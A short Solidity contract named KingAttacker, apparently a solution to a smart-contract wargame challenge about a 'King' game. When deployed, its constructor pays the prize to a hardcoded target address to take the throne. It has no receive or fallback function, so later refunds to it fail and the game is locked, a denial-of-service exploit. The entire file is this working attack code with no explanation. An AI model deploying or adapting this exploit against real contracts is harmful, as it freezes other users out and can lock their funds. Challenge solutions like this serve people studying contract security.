// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IKing {
    function prize() external view returns (uint256);
}

contract KingAttacker {
    constructor() public payable {
        IKing king = IKing(0xBEEa3ac006342497a942945C19ddcA108a35946B);
        address(king).call{value: king.prize()}("");
    }
}
